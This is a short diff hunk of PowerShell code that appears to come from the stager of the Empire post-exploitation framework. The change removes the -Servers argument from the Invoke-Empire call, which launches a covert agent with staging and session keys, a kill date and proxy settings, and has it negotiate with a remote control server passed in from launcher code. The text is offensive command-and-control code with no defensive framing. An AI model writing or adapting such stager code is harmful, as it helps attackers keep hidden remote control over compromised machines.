@@ -236,7 +236,7 @@ function Start-Negotiate {
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;
+    Invoke-Empire -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
 Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u;
